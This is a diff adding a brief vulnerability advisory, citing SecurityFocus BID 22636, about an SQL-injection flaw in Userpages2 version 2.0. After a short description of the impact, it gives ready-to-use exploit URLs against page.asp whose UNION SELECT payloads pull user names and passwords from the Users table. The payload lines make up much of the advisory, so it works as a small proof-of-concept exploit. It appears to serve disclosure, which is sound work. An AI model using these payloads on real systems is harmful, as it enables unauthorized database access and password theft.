@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/22636/info
+
+Userpages2 is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation.
+
+Version 2.0 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/page.asp?art_id=[SQL]
+http://www.example.com/page.asp?art_id=-1+union+select+0,Name,2,3,4,5,6,7,8,9+from+Users+where+id=1
+http://www.example.com/page.asp?art_id=-1+union+select+0,PassWord,2,3,4,5,6,7,8,9+from+Users+where+id=1 
